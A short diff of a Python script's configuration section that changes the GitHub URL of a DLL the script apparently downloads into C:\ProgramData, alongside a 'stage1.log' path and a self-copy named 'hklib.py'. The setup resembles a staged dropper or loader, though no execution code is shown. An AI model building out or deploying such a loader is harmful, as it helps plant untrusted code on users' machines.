@@ -5,7 +5,7 @@ import urllib.request
 # ═══════════════════════════════════════════════
 # CONFIGURATION
 # ═══════════════════════════════════════════════
-dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/V2/TEST_Dll1.dll"
+dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/TEST_Dll1.dll"
 dll_path  = r"C:\ProgramData\TEST_Dll1.dll"
 log_path  = r"C:\ProgramData\stage1.log"
 self_py   = r"C:\ProgramData\hklib.py"
